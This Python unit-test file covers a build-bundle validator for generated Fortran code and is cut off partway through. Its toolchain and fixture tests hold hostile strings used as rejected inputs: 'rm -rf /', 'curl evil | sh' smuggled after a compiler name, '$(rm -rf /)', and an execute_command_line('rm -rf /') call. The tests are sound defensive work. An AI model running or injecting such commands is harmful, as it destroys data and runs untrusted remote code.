"""Unit tests for the Z0 `CodegenBundle` contract (`tools/codegen_bundle.py`).

The six acceptance items of Z0 (`docs/design/zero_base_architecture.md`, Decision
Criteria) each get a class here: multi-file source, a private helper procedure, target
capability negotiation, deterministic build-graph derivation, forbidden arbitrary
commands, and a multi-node optimization-unit manifest. The remaining classes cover the
`logical_path` adversarial matrix and the contract plumbing (schema/module agreement,
version gating, clause-not-exception on hostile input).

No producer of a bundle exists yet (it arrives with Z2), so these tests are the whole of
the contract's verification: the fixtures below are the only bundles in the repository.
"""

import copy
import json
import re
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from tools import codegen_bundle as cb
from tools import workflow_conductor as wc

ADV = "problem/adv1d@0.1.0"
FLUX = "component/adv_flux@0.1.0"
HARNESS = "infrastructure/harness_fortran_cpu@0.3.0"


def _module_name(path: str) -> str:
    """A unique Fortran module name derived from the whole path (so `core/util.f90` and
    `io/util.f90` do not collide): non-identifier chars become `_`, a non-alpha start is
    prefixed."""
    stem = re.sub(r"[^A-Za-z0-9]", "_", path.rsplit(".", 1)[0])
    if not stem or not stem[0].isalpha():
        stem = "m_" + stem
    return stem[:63]


def _file(path: str, role: str, member: str | None, modules: "list[str] | None" = None) -> dict:
    return {"logical_path": path, "role": role, "language": "fortran",
            "member_node_key": member, "content": f"! {path}\n",
            "modules": modules if modules is not None else [_module_name(path)]}


def _minimal_bundle() -> dict:
    """The current M3c shape: one member, a model + a checks module, the checks-getter
    state capture, and the synchronous CPU harness."""
    return {
        "bundle_schema_version": "1.0.0",
        "optimization_unit": {"members": [ADV]},
        "files": [
            _file("adv1d_model.f90", "model", ADV),
            _file("adv1d_checks.f90", "checks", ADV),
        ],
        "entrypoints": [
            {"symbol": "adv1d__apply", "kind": "operation", "node_key": ADV,
             "defined_in": "adv1d_model.f90", "module": "adv1d_model"},
        ],
        "target_lowering_plan": {"precision": {"real_kind": "real64"},
                                 "state_residency": "host"},
        "capability_requirements": ["sync_single_case@1"],
        "state_bindings": [
            {"node_key": ADV, "state_variable": "q", "storage_symbol": "get_r1",
             "module": "adv1d_checks", "capture": "checks_getter", "capability": None},
        ],
    }


def _multi_node_bundle() -> dict:
    """A two-member optimization unit with a unit-shared internal module: the shape that
    proves a semantic node boundary is not a mandatory optimization boundary."""
    return {
        "bundle_schema_version": "1.0.0",
        "optimization_unit": {"members": [FLUX, ADV]},
        "files": [
            _file("unit_types.f90", "internal_module", None),
            _file("adv_flux_model.f90", "model", FLUX),
            _file("adv_flux_checks.f90", "checks", FLUX),
            _file("adv1d_model.f90", "model", ADV),
            _file("adv1d_checks.f90", "checks", ADV),
        ],
        "entrypoints": [
            {"symbol": "adv_flux__apply", "kind": "operation", "node_key": FLUX,
             "defined_in": "adv_flux_model.f90", "module": "adv_flux_model"},
            {"symbol": "adv1d__apply", "kind": "operation", "node_key": ADV,
             "defined_in": "adv1d_model.f90", "module": "adv1d_model"},
        ],
        "target_lowering_plan": {
            "precision": {"real_kind": "real64"},
            "state_residency": "host",
            "fusion": [{"members": [FLUX, ADV]}],
        },
        "capability_requirements": ["sync_single_case@1"],
        "state_bindings": [],
    }


def _find(files: list[dict], path: str) -> dict:
    return next(entry for entry in files if entry["logical_path"] == path)


class MultiFileSourceTest(unittest.TestCase):
    """Acceptance 1: the bundle carries several compilation units."""

    def test_five_file_bundle_is_valid_and_builds_in_role_order(self) -> None:
        doc = _minimal_bundle()
        doc["files"] += [
            _file("adv1d_types.f90", "internal_module", ADV),
            _file("unit_constants.f90", "internal_module", None),
            _file("adv1d_limiter.f90", "helper", ADV),
        ]
        self.assertEqual(cb.validate_bundle(doc), [])

        graph = cb.derive_build_graph(doc, toolchain={"language": "fortran"})
        self.assertEqual([unit["object"] for unit in graph["compile_units"]], [
            # internal_module (unit-shared first) -> helper -> model -> checks
            "unit_constants.o", "adv1d_types.o", "adv1d_limiter.o",
            "adv1d_model.o", "adv1d_checks.o",
        ])
        self.assertEqual(len(graph["link"]["objects"]), 5)

    def test_multiple_files_of_one_role_are_ordered_by_logical_path(self) -> None:
        doc = _minimal_bundle()
        doc["files"] += [_file("z_helper.f90", "helper", ADV),
                         _file("a_helper.f90", "helper", ADV)]
        self.assertEqual(cb.validate_bundle(doc), [])
        graph = cb.derive_build_graph(doc, toolchain={})
        self.assertEqual([unit["object"] for unit in graph["compile_units"]][:2],
                         ["a_helper.o", "z_helper.o"])


class PrivateHelperTest(unittest.TestCase):
    """Acceptance 2: privacy is declared by role, not inferred from the source text."""

    def test_helper_without_an_entrypoint_is_valid(self) -> None:
        doc = _minimal_bundle()
        doc["files"].append(_file("adv1d_limiter.f90", "helper", ADV))
        self.assertEqual(cb.validate_bundle(doc), [])

    def test_helper_cannot_define_an_entrypoint(self) -> None:
        # Use a checks_interface kind so the only defect is the privacy violation (an extra
        # `operation` would additionally trip the one-operation-per-member rule).
        doc = _minimal_bundle()
        doc["files"].append(_file("adv1d_limiter.f90", "helper", ADV))
        doc["entrypoints"].append(
            {"symbol": "adv1d__limit", "kind": "checks_interface", "node_key": ADV,
             "defined_in": "adv1d_limiter.f90", "module": "adv1d_limiter"})
        violations = cb.validate_bundle(doc)
        self.assertEqual(len(violations), 1)
        self.assertIn("private and cannot define an entrypoint", violations[0])

    def test_internal_module_cannot_define_an_entrypoint(self) -> None:
        doc = _minimal_bundle()
        doc["files"].append(_file("adv1d_types.f90", "internal_module", ADV))
        doc["entrypoints"].append(
            {"symbol": "adv1d__types", "kind": "operation", "node_key": ADV,
             "defined_in": "adv1d_types.f90", "module": "adv1d_types"})
        self.assertTrue(any("private and cannot define an entrypoint" in v
                            for v in cb.validate_bundle(doc)))

    def test_shared_helper_takes_a_null_member(self) -> None:
        doc = _minimal_bundle()
        doc["files"].append(_file("unit_util.f90", "helper", None))
        self.assertEqual(cb.validate_bundle(doc), [])

    def test_model_may_not_take_a_null_member(self) -> None:
        doc = _minimal_bundle()
        _find(doc["files"], "adv1d_model.f90")["member_node_key"] = None
        violations = cb.validate_bundle(doc)
        self.assertTrue(any("member_node_key may be null only for role" in v for v in violations))

    def test_checks_entrypoint_must_live_in_a_checks_file(self) -> None:
        doc = _minimal_bundle()
        doc["entrypoints"].append(
            {"symbol": "case_run", "kind": "checks_interface", "node_key": ADV,
             "defined_in": "adv1d_model.f90", "module": "adv1d_model"})
        violations = cb.validate_bundle(doc)
        self.assertEqual(len(violations), 1)
        self.assertIn("must be defined in a file of role 'checks'", violations[0])

    def test_entrypoint_declares_its_fortran_module(self) -> None:
        # Z2 renders `use <module>, only: <symbol>` mechanically, so the module is a declared
        # field (a file may define several modules; the host never parses the source).
        doc = _minimal_bundle()
        del doc["entrypoints"][0]["module"]
        self.assertIn("entrypoints[0].module is required", cb.validate_bundle(doc))
        doc = _minimal_bundle()
        doc["entrypoints"][0]["module"] = "9 not an identifier"
        self.assertIn("entrypoints[0].module must be an identifier", cb.validate_bundle(doc))
        doc = _minimal_bundle()
        doc["entrypoints"][0]["module"] = "m" + "x" * 63  # 64 chars, over the f2008 limit
        self.assertIn("entrypoints[0].module must be an identifier", cb.validate_bundle(doc))

    def test_entrypoint_module_must_be_defined_by_defined_in(self) -> None:
        # The bypass Codex found: `defined_in` names the member's own file (ownership passes),
        # but `module`/`symbol` point at another member's export. `module` must be one the
        # `defined_in` file actually defines.
        doc = _multi_node_bundle()
        flux_ep = next(e for e in doc["entrypoints"] if e["node_key"] == FLUX)
        flux_ep["module"] = "adv1d_model"       # ADV's module, defined_in is FLUX's model file
        flux_ep["symbol"] = "adv_flux__apply2"  # a fresh symbol (not a duplicate)
        self.assertTrue(any(
            "module 'adv1d_model' is not defined by 'adv_flux_model.f90'" in v
            for v in cb.validate_bundle(doc)))

    def test_files_declare_the_modules_they_define(self) -> None:
        doc = _minimal_bundle()
        del doc["files"][0]["modules"]
        self.assertIn("files[0].modules is required", cb.validate_bundle(doc))
        doc = _minimal_bundle()
        doc["files"][0]["modules"] = []
        self.assertIn("files[0].modules must be a non-empty array", cb.validate_bundle(doc))
        doc = _minimal_bundle()
        doc["files"][0]["modules"] = ["9bad"]
        self.assertIn("files[0].modules[0] must be an identifier", cb.validate_bundle(doc))

    def test_a_module_name_is_unique_across_the_bundle(self) -> None:
        # One `.mod` per module: two files defining the same module is a build collision.
        doc = _minimal_bundle()
        doc["files"].append(_file("adv1d_helper.f90", "helper", ADV, modules=["adv1d_model"]))
        self.assertTrue(any("is already defined by another file" in v
                            for v in cb.validate_bundle(doc)))
        # case-insensitively (Fortran module names are case-insensitive)
        doc = _minimal_bundle()
        doc["files"].append(_file("adv1d_helper.f90", "helper", ADV, modules=["ADV1D_MODEL"]))
        self.assertTrue(any("is already defined by another file" in v
                            for v in cb.validate_bundle(doc)))

    def test_entrypoint_must_reference_an_existing_file(self) -> None:
        doc = _minimal_bundle()
        doc["entrypoints"][0]["defined_in"] = "nowhere.f90"
        violations = cb.validate_bundle(doc)
        self.assertTrue(any("does not name a files[] entry" in v for v in violations))


class CapabilityNegotiationTest(unittest.TestCase):
    """Acceptance 3: exact-token negotiation against the harness capability ABI."""

    def test_current_harness_satisfies_the_current_bundle(self) -> None:
        provided = cb.harness_provided_capabilities(HARNESS)
        self.assertEqual(provided, frozenset({"sync_single_case@1"}))
        self.assertEqual(
            cb.unsatisfied_capability_requirements(["sync_single_case@1"], provided), [])

    def test_state_registration_is_not_provided_by_the_current_harness(self) -> None:
        provided = cb.harness_provided_capabilities(HARNESS)
        self.assertEqual(
            cb.unsatisfied_capability_requirements(
                ["sync_single_case@1", "state_registration@1"], provided),
            ["state_registration@1"])

    def test_version_skew_is_unsatisfied_no_ordering_is_assumed(self) -> None:
        # @2 is NOT satisfied by a harness providing @1: compatibility is declared by
        # adding a token to a manifest, never inferred from version ordering.
        provided = cb.harness_provided_capabilities(HARNESS)
        self.assertEqual(
            cb.unsatisfied_capability_requirements(["sync_single_case@2"], provided),
            ["sync_single_case@2"])

    def test_undeclared_harness_provides_nothing(self) -> None:
        self.assertIsNone(cb.harness_provided_capabilities("infrastructure/harness_gpu@0.1.0"))
        self.assertEqual(
            cb.unsatisfied_capability_requirements(["sync_single_case@1"], None),
            ["sync_single_case@1"])

    def test_unknown_capability_name_is_unsatisfied_even_when_provided(self) -> None:
        self.assertEqual(
            cb.unsatisfied_capability_requirements(["gpu_magic@1"], {"gpu_magic@1"}),
            ["gpu_magic@1"])

    def test_malformed_token_is_unsatisfied_even_when_provided(self) -> None:
        # The vocabulary half is not the whole rule: a token that fails the GRAMMAR is
        # unsatisfied too, even if a manifest lists the identical malformed string.
        for token in ("sync_single_case@>=1", "sync_single_case", "SYNC_SINGLE_CASE@1",
                      "sync_single_case@1\n"):
            with self.subTest(token=token):
                self.assertEqual(cb.unsatisfied_capability_requirements([token], {token}), [token])

    def test_unknown_capability_name_is_a_bundle_violation(self) -> None:
        # Fail-closed at the contract layer too, independently of any manifest.
        doc = _minimal_bundle()
        doc["capability_requirements"] = ["sync_single_case@1", "gpu_magic@1"]
        violations = cb.validate_bundle(doc)
        self.assertTrue(any("is not a known harness capability" in v for v in violations))

    def test_malformed_token_is_a_schema_violation(self) -> None:
        doc = _minimal_bundle()
        doc["capability_requirements"] = ["sync_single_case@>=1"]
        violations = cb.validate_bundle(doc)
        self.assertTrue(any("must be a capability token" in v for v in violations))

    def test_exactly_one_execution_model_capability(self) -> None:
        doc = _minimal_bundle()
        doc["capability_requirements"] = ["full_state_capture@1"]
        self.assertTrue(any("exactly one execution-model capability" in v
                            for v in cb.validate_bundle(doc)))
        doc["capability_requirements"] = ["sync_single_case@1", "batched_cases@1"]
        self.assertTrue(any("exactly one execution-model capability" in v
                            for v in cb.validate_bundle(doc)))

    def test_duplicate_requirement_is_rejected(self) -> None:
        doc = _minimal_bundle()
        doc["capability_requirements"] = ["sync_single_case@1", "sync_single_case@1"]
        self.assertTrue(any("must not repeat" in v for v in cb.validate_bundle(doc)))


class DeterministicBuildGraphTest(unittest.TestCase):
    """Acceptance 4: the build graph is a deterministic function of roles and closure."""

    def test_file_order_does_not_change_the_graph(self) -> None:
        doc = _minimal_bundle()
        doc["files"] += [_file("adv1d_types.f90", "internal_module", ADV),
                         _file("adv1d_limiter.f90", "helper", ADV)]
        shuffled = copy.deepcopy(doc)
        shuffled["files"] = list(reversed(shuffled["files"]))

        kwargs = {"dependency_closure": (HARNESS,),
                  "toolchain": {"language": "fortran", "standard": "f2008"},
                  "host_glue_sources": ("adv1d_runner.f90",)}
        first = json.dumps(cb.derive_build_graph(doc, **kwargs), sort_keys=True)
        second = json.dumps(cb.derive_build_graph(shuffled, **kwargs), sort_keys=True)
        self.assertEqual(first, second)

    def test_dependency_closure_precedes_bundle_and_glue_comes_last(self) -> None:
        graph = cb.derive_build_graph(
            _minimal_bundle(),
            dependency_closure=("component/base@0.1.0", "component/mid@0.1.0"),
            toolchain={"language": "fortran"}, host_glue_sources=("adv1d_runner.f90",))
        self.assertEqual([unit["source"] for unit in graph["compile_units"]], [
            "staged:base_model.f90", "staged:mid_model.f90",
            "bundle:adv1d_model.f90", "bundle:adv1d_checks.f90",
            "glue:adv1d_runner.f90",
        ])
        # conservative total order: each unit depends on every object emitted before it
        self.assertEqual(graph["compile_units"][0]["prerequisite_objects"], [])
        self.assertEqual(graph["compile_units"][-1]["prerequisite_objects"],
                         graph["link"]["objects"][:-1])

    def test_graph_carries_no_command_slot(self) -> None:
        graph = cb.derive_build_graph(
            _minimal_bundle(), dependency_closure=("infrastructure/harness_fortran_cpu@0.3.0",),
            toolchain={"language": "fortran", "build_system": "make"},
            host_glue_sources=("adv1d_runner.f90",))
        blob = json.dumps(graph, sort_keys=True)
        for key in ("command", "commands", "recipe", "script", "shell", "flags", "argv"):
            self.assertNotIn(key, blob)
        # command synthesis belongs to the target backend (Z2); the graph is pure data
        self.assertEqual(set(graph), {"toolchain", "compile_units", "link"})
        for unit in graph["compile_units"]:
            self.assertEqual(set(unit), {"source", "object", "prerequisite_objects"})

    def test_toolchain_is_projected_onto_the_declarative_allowlist(self) -> None:
        # The IR toolchain object is not closed, so a stray command/flag key must NOT ride
        # into the graph — that would defeat the "no command or flag slot" guarantee.
        toolchain = {"language": "fortran", "standard": "f2008", "build_system": "make",
                     "command": "rm -rf /", "flags": "-O3; curl evil | sh"}
        graph = cb.derive_build_graph(_minimal_bundle(), toolchain=toolchain)
        self.assertEqual(graph["toolchain"],
                         {"language": "fortran", "standard": "f2008", "build_system": "make"})
        self.assertNotIn("rm -rf", json.dumps(graph))

    def test_toolchain_projection_is_an_isolated_copy(self) -> None:
        toolchain = {"language": "fortran", "standard": "f2008"}
        graph = cb.derive_build_graph(_minimal_bundle(), toolchain=toolchain)
        graph["toolchain"]["standard"] = "f2018"
        self.assertEqual(toolchain["standard"], "f2008")

    def test_every_declarative_toolchain_field_survives(self) -> None:
        # A realistic value per field: the executable selectors must be recognized drivers.
        toolchain = {"language": "fortran", "standard": "f2008", "build_system": "make",
                     "compiler": "gfortran", "linker": "gfortran", "backend": "openmp"}
        self.assertEqual(sorted(toolchain), sorted(cb.TOOLCHAIN_ECHO_KEYS))
        graph = cb.derive_build_graph(_minimal_bundle(), toolchain=toolchain)
        self.assertEqual(graph["toolchain"], toolchain)

    def test_shell_syntax_in_an_executable_selector_is_dropped(self) -> None:
        # compiler/linker are run as a program; a shell string must never reach the graph.
        graph = cb.derive_build_graph(_minimal_bundle(), toolchain={
            "language": "fortran", "compiler": "gfortran; curl evil | sh",
            "linker": "$(rm -rf /)"})
        self.assertEqual(graph["toolchain"], {"language": "fortran"})
        self.assertNotIn("curl", json.dumps(graph))

    def test_recognized_fortran_compiler_drivers_are_kept(self) -> None:
        # The bundle is fortran (files[].language), so only Fortran drivers are carried.
        for value in ("gfortran", "gfortran-12", "x86_64-linux-gnu-gfortran-12",
                      "mpif90", "frt", "frtpx", "ifx", "nvfortran", "flang-new", "crayftn"):
            with self.subTest(compiler=value):
                graph = cb.derive_build_graph(_minimal_bundle(), toolchain={"compiler": value})
                self.assertEqual(graph["toolchain"], {"compiler": value})

    def test_a_wrong_language_compiler_driver_is_dropped(self) -> None:
        # A C/C++-only driver would be pinned as FC and deterministically fail on `.f90`, so it
        # is not carried for a fortran bundle (the allowlist is keyed by language).
        for value in ("gcc", "g++", "clang", "icc", "icx", "nvc", "mpicc", "fcc", "FCCpx",
                      "xlc", "armclang"):
            with self.subTest(compiler=value):
                graph = cb.derive_build_graph(_minimal_bundle(), toolchain={"compiler": value})
                self.assertNotIn("compiler", graph["toolchain"])

    def test_executable_selectors_that_are_not_recognized_drivers_are_dropped(self) -> None:
        # Shell-metachar-free is NOT enough: a bare shell, an absolute path, or a traversal is
        # runnable. Only a recognized compiler driver (bare name, no path) is carried.
        for value in ("sh", "bash", "/tmp/payload", "/usr/bin/gfortran", "foo/../../payload",
                      "python3", "make"):
            with self.subTest(compiler=value):
                graph = cb.derive_build_graph(_minimal_bundle(), toolchain={"compiler": value})
                self.assertEqual(graph["toolchain"], {})

    def test_a_compiler_looking_suffix_on_an_arbitrary_prefix_is_dropped(self) -> None:
        # The cross-compiler prefix must be a target triple (arch-first), not an arbitrary
        # token: `payload-gfortran` on PATH would otherwise be run as a "compiler".
        for value in ("payload-gfortran", "sh-gfortran", "evil-gcc", "notanarch-linux-gnu-gfortran"):
            with self.subTest(compiler=value):
                graph = cb.derive_build_graph(_minimal_bundle(), toolchain={"compiler": value})
                self.assertEqual(graph["toolchain"], {})
        # a genuine target triple (known arch first) is kept
        for value in ("x86_64-linux-gnu-gfortran-12", "aarch64-linux-gnu-gfortran",
                      "powerpc64le-linux-gnu-gfortran"):
            with self.subTest(compiler=value):
                graph = cb.derive_build_graph(_minimal_bundle(), toolchain={"compiler": value})
                self.assertEqual(graph["toolchain"], {"compiler": value})

    def test_declarative_field_with_shell_metacharacters_is_dropped(self) -> None:
        graph = cb.derive_build_graph(_minimal_bundle(),
                                      toolchain={"standard": "f2008 -o /etc/x", "backend": "openmp"})
        self.assertEqual(graph["toolchain"], {"backend": "openmp"})

    def test_unset_compiler_is_dropped_not_carried_empty(self) -> None:
        # _read_toolchain yields "" for an unset compiler; "" is not a selector.
        graph = cb.derive_build_graph(_minimal_bundle(),
                                      toolchain={"language": "fortran", "compiler": ""})
        self.assertEqual(graph["toolchain"], {"language": "fortran"})

    def test_nested_paths_cannot_collide_on_an_object_name(self) -> None:
        doc = _minimal_bundle()
        doc["files"] += [_file("core/util.f90", "helper", ADV),
                         _file("io/util.f90", "helper", ADV)]
        self.assertEqual(cb.validate_bundle(doc), [])
        objects = [unit["object"] for unit in cb.derive_build_graph(doc, toolchain={})["compile_units"]]
        self.assertEqual(len(set(objects)), len(objects))
        self.assertIn("core__util.o", objects)

    def test_m3c_parity_with_the_conductor_authored_makefile(self) -> None:
        """The derived object order for an M3c-shape bundle equals the object order of the
        Makefile the conductor renders on the `legacy` executor (`_write_makefile`).

        Z2 landed WITHOUT replacing `_write_makefile`: the pure executor renders from this
        graph via its own `_render_pure_makefile_from_graph`, and `_write_makefile` is
        unchanged. So the two renders are NOT byte-identical (header comments differ, and
        legacy carries `MODEL_SRC`/`MODEL_OBJ` variables where pure inlines per-compile-unit
        paths). What must agree is the derived build graph — the object set and its order —
        which is what this test pins. Canonical: `CODEGEN_BUNDLE_CONTRACT.md` §Parity."""
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp)
            refs = wc.NodeRefs(node_key="problem/adv1d@0.1.0", spec_path="spec/problem/adv1d",
                               ir_id="i1", pipeline_id="p1", source_id="s1", binary_id="b1")
            ir_dir = repo / refs.ir_ref
            ir_dir.mkdir(parents=True, exist_ok=True)
            (ir_dir / "spec.ir.yaml").write_text(
                "impl_defaults:\n  toolchain:\n    language: fortran\n    standard: f2008\n"
                "    build_system: make\n  target:\n    backend: serial\n"
                "dependency:\n"
                f'  node_key: "{ADV}"\n'
                "  direct_deps:\n"
                f'    - node_key: "{FLUX}"\n'
                f'    - node_key: "{HARNESS}"\n',
                encoding="utf-8")
            (ir_dir / "dependency_graph.json").write_text(json.dumps({
                "node_key": ADV,
                "all_nodes": [
                    {"node_key": HARNESS, "topo_level": 0},
                    {"node_key": FLUX, "topo_level": 0},
                    {"node_key": ADV, "topo_level": 1},
                ],
                "transitive_deps": [],
                "generated_by": "conductor",
            }), encoding="utf-8")

            conductor = wc.Conductor(repo_root=repo, orchestration_id="o",
                                     orchestration_agent_run_id="ORCH", backend="claude", env={})
            self.assertTrue(conductor._conductor_authors_runner(refs))  # the M3c shape
            # derive_build_graph takes node_keys (deepest-first); the conductor maps the same
            # ordered node list to the spec_id object basenames the Makefile uses.
            closure = tuple(conductor._dependency_closure_nodes(refs))
            conductor._write_makefile(refs)
            makefile = (repo / refs.source_dir() / "src" / "Makefile").read_text(encoding="utf-8")

        graph = cb.derive_build_graph(
            _minimal_bundle(), dependency_closure=closure,
            toolchain={"language": "fortran", "build_system": "make"},
            host_glue_sources=("adv1d_runner.f90",))
        self.assertEqual(graph["link"]["objects"],
                         self._makefile_link_objects(makefile))

    @staticmethod
    def _makefile_link_objects(text: str) -> list[str]:
        """The ordered object basenames of the Makefile's link prerequisites, resolved
        through the variable declarations in the same file."""
        variables = dict(re.findall(r"^([A-Z_]+)\s*=\s*(.+)$", text, flags=re.MULTILINE))
        link = re.search(r"^\$\(BINDIR\)/\$\(BIN\):(.*?)(?:\||$)", text, flags=re.MULTILINE)
        assert link is not None
        objects: list[str] = []
        for token in link.group(1).split():
            expanded = variables.get(token[2:-1], token) if token.startswith("$(") else token
            for obj in expanded.split():
                objects.append(obj.replace("$(OBJDIR)/", ""))
        return objects


class CompileAfterTest(unittest.TestCase):
    """`compile_after` orders two files of the same role that role precedence alone cannot
    (one `use`s a module the other defines). Role precedence orders different roles; without
    an explicit edge, a lexical tie-break could compile a consumer before its provider."""

    def _two_internal_modules(self, *, edge: bool) -> dict:
        doc = _minimal_bundle()
        consumer = _file("a_consumer.f90", "internal_module", ADV)
        if edge:
            consumer["compile_after"] = ["z_base.f90"]
        doc["files"] += [_file("z_base.f90", "internal_module", ADV), consumer]
        return doc

    def test_without_an_edge_lexical_order_places_consumer_first(self) -> None:
        # The hazard the field exists to remove: a_consumer sorts before z_base lexically.
        doc = self._two_internal_modules(edge=False)
        self.assertEqual(cb.validate_bundle(doc), [])
        order = [u["object"] for u in cb.derive_build_graph(doc, toolchain={})["compile_units"]]
        self.assertLess(order.index("a_consumer.o"), order.index("z_base.o"))

    def test_compile_after_reorders_the_provider_first(self) -> None:
        doc = self._two_internal_modules(edge=True)
        self.assertEqual(cb.validate_bundle(doc), [])
        units = cb.derive_build_graph(doc, toolchain={})["compile_units"]
        order = [u["object"] for u in units]
        self.assertLess(order.index("z_base.o"), order.index("a_consumer.o"))
        # the conservative prerequisites therefore already include the provider
        consumer = next(u for u in units if u["object"] == "a_consumer.o")
        self.assertIn("z_base.o", consumer["prerequisite_objects"])

    def test_order_is_deterministic_under_permutation(self) -> None:
        doc = self._two_internal_modules(edge=True)
        shuffled = copy.deepcopy(doc)
        shuffled["files"] = list(reversed(shuffled["files"]))
        self.assertEqual(
            json.dumps(cb.derive_build_graph(doc, toolchain={}), sort_keys=True),
            json.dumps(cb.derive_build_graph(shuffled, toolchain={}), sort_keys=True))

    def test_a_chain_orders_transitively(self) -> None:
        doc = _minimal_bundle()
        doc["files"] += [
            dict(_file("c.f90", "internal_module", ADV), compile_after=["b.f90"]),
            dict(_file("b.f90", "internal_module", ADV), compile_after=["a.f90"]),
            _file("a.f90", "internal_module", ADV),
        ]
        self.assertEqual(cb.validate_bundle(doc), [])
        order = [u["object"] for u in cb.derive_build_graph(doc, toolchain={})["compile_units"]]
        self.assertLess(order.index("a.o"), order.index("b.o"))
        self.assertLess(order.index("b.o"), order.index("c.o"))

    def test_dangling_reference_is_rejected(self) -> None:
        doc = _minimal_bundle()
        doc["files"].append(dict(_file("h.f90", "helper", ADV), compile_after=["nope.f90"]))
        self.assertIn("files[2].compile_after 'nope.f90' does not name a files[] entry",
                      cb.validate_bundle(doc))

    def test_self_reference_is_rejected(self) -> None:
        doc = _minimal_bundle()
        doc["files"].append(dict(_file("h.f90", "helper", ADV), compile_after=["h.f90"]))
        self.assertIn("files[2].compile_after must not name the file itself ('h.f90')",
                      cb.validate_bundle(doc))

    def test_precedence_reversing_edge_is_rejected(self) -> None:
        # A model must not depend on its checks: ROLE_BUILD_PRECEDENCE already orders the
        # model first and the checks module `use`s it. Honoring such an edge would emit
        # checks before model and break the build.
        doc = _minimal_bundle()
        for entry in doc["files"]:
            if entry["role"] == "model":
                entry["compile_after"] = ["adv1d_checks.f90"]
        self.assertIn(
            "files[0].compile_after 'adv1d_checks.f90' has role 'checks', which build "
            "precedence orders after this 'model' file (compile_after must not reverse "
            "ROLE_BUILD_PRECEDENCE)",
            cb.validate_bundle(doc))

    def test_precedence_agreeing_cross_role_edge_is_valid(self) -> None:
        # checks -> model agrees with role precedence (redundant but not a reversal), and a
        # helper -> internal_module edge likewise.
        doc = _minimal_bundle()
        for entry in doc["files"]:
            if entry["role"] == "checks":
                entry["compile_after"] = ["adv1d_model.f90"]
        self.assertEqual(cb.validate_bundle(doc), [])
        doc = _minimal_bundle()
        doc["files"] += [_file("types.f90", "internal_module", ADV),
                         dict(_file("h.f90", "helper", ADV), compile_after=["types.f90"])]
        self.assertEqual(cb.validate_bundle(doc), [])

    def test_cycles_are_rejected(self) -> None:
        doc = _minimal_bundle()
        doc["files"] += [
            dict(_file("p.f90", "internal_module", ADV), compile_after=["q.f90"]),
            dict(_file("q.f90", "internal_module", ADV), compile_after=["p.f90"]),
        ]
        self.assertIn("files compile_after has a dependency cycle involving ['p.f90', 'q.f90']",
                      cb.validate_bundle(doc))

    def test_a_cyclic_bundle_still_yields_every_object(self) -> None:
        # derive_build_graph documents a valid bundle, but a cycle must not drop a file from
        # the link (which would silently shrink the build).
        doc = _minimal_bundle()
        doc["files"] += [
            dict(_file("p.f90", "internal_module", ADV), compile_after=["q.f90"]),
            dict(_file("q.f90", "internal_module", ADV), compile_after=["p.f90"]),
        ]
        objects = [u["object"] for u in cb.derive_build_graph(doc, toolchain={})["compile_units"]]
        self.assertEqual(sorted(objects),
                         sorted(["p.o", "q.o", "adv1d_model.o", "adv1d_checks.o"]))

    def test_compile_after_must_be_a_string_array(self) -> None:
        doc = _minimal_bundle()
        doc["files"][0]["compile_after"] = "adv1d_checks.f90"
        self.assertIn("files[0].compile_after must be an array", cb.validate_bundle(doc))
        doc = _minimal_bundle()
        doc["files"][0]["compile_after"] = [""]
        self.assertIn("files[0].compile_after[0] must be a non-empty string",
                      cb.validate_bundle(doc))

    def test_absent_compile_after_is_valid_and_default_ordered(self) -> None:
        # backward compatibility: the field is optional and its absence is the M3c shape
        doc = _minimal_bundle()
        self.assertEqual(cb.validate_bundle(doc), [])
        self.assertNotIn("compile_after", doc["files"][0])


class ForbiddenCommandTest(unittest.TestCase):
    """Acceptance 5: the bundle has no build authority — enforced structurally."""

    def test_reserved_build_filenames_are_rejected(self) -> None:
        for name in ("Makefile", "makefile", "GNUmakefile", "CMakeLists.txt", "configure"):
            with self.subTest(name=name):
                violations = cb.logical_path_violations(name, language="fortran")
                self.assertTrue(any("reserved build filename" in v for v in violations), name)

    def test_script_extensions_are_rejected(self) -> None:
        for name in ("build.sh", "build.bash", "rules.mk", "toolchain.cmake", "setup.py"):
            with self.subTest(name=name):
                violations = cb.logical_path_violations(name, language="fortran")
                self.assertTrue(any("build/script extension" in v for v in violations), name)

    def test_a_non_fortran_extension_is_rejected(self) -> None:
        violations = cb.logical_path_violations("adv1d_model.c", language="fortran")
        self.assertTrue(any("must be one of .f90" in v for v in violations))

    def test_unknown_file_role_is_rejected(self) -> None:
        doc = _minimal_bundle()
        doc["files"].append(_file("build_rules.f90", "script", ADV))
        violations = cb.validate_bundle(doc)
        self.assertTrue(any("role must be one of" in v for v in violations))

    def test_command_bearing_top_level_keys_are_rejected_by_closure(self) -> None:
        for key, value in (("build_commands", ["gfortran -c adv1d_model.f90"]),
                           ("compile_flags", "-O3"),
                           ("post_build_hook", "./install.sh")):
            with self.subTest(key=key):
                doc = _minimal_bundle()
                doc[key] = value
                violations = cb.validate_bundle(doc)
                self.assertIn(f"unknown key {key!r} (the object is closed)", violations)

    def test_command_bearing_file_keys_are_rejected_by_closure(self) -> None:
        doc = _minimal_bundle()
        doc["files"][0]["compile_command"] = "gfortran -O3 -c adv1d_model.f90"
        violations = cb.validate_bundle(doc)
        self.assertIn("files[0].unknown key 'compile_command' (the object is closed)", violations)

    def test_shell_text_inside_fortran_content_is_not_scanned(self) -> None:
        # Deliberate: a Fortran source legitimately holds string literals, so a content
        # scan is a false-positive source and buys no guarantee over the structural rules.
        doc = _minimal_bundle()
        doc["files"][0]["content"] = (
            "module adv1d_model\n"
            "  character(len=*), parameter :: msg = 'run: gfortran -O2 model.f90 && ./a.out'\n"
            "end module adv1d_model\n")
        self.assertEqual(cb.validate_bundle(doc), [])

    def test_runtime_shell_calls_are_out_of_the_command_prohibition_scope(self) -> None:
        # The command prohibition is about host ASSEMBLY, not the compiled program's runtime.
        # A generated `execute_command_line` is contained by the execution sandbox (bwrap),
        # not by this contract; the validator does not (and cannot soundly) reject it.
        doc = _minimal_bundle()
        doc["files"][0]["content"] = (
            "module adv1d_model\ncontains\n"
            "  subroutine adv1d__apply()\n"
            "    call execute_command_line('rm -rf /')\n"
            "  end subroutine adv1d__apply\n"
            "end module adv1d_model\n")
        self.assertEqual(cb.validate_bundle(doc), [])


class FieldGrammarTest(unittest.TestCase):
    """Every per-field clause is pinned by a document that must be rejected. Without
    these, a dropped enum check lets an out-of-vocabulary value through — and an
    out-of-vocabulary value ALSO bypasses the coupling invariants keyed on it (a
